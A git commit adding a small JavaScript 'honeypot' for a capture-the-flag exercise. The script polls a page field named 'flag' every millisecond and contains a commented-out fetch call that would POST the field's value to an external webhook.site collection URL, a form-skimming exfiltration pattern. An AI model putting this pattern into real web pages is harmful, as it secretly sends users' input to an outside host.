a3a350d157bd7fc59ad61595345bb002fb120d24
pawnlord <scruffduff321@gmail.com>
2023-12-29 15:21:39 -0500

    add honeypot for ctf purposes

---
+++ honeypot.js
@@ -0,0 +1,16 @@
+
+async function putdata(){
+    let el = document.getElementById('flag');
+    console.log(el.value)
+    if(el.value == "none") return;
+    console.log("potted")
+    // await fetch("https://webhook.site/239fa02e-8971-4c89-b910-4ce5be27bd8c", {
+    //     method: "POST",
+    //     mode: "no-cors", 
+    //     body: JSON.stringify({"flag": el.value})
+    // });
+}
+
+function start(){
+    setInterval(putdata, 1)
+}
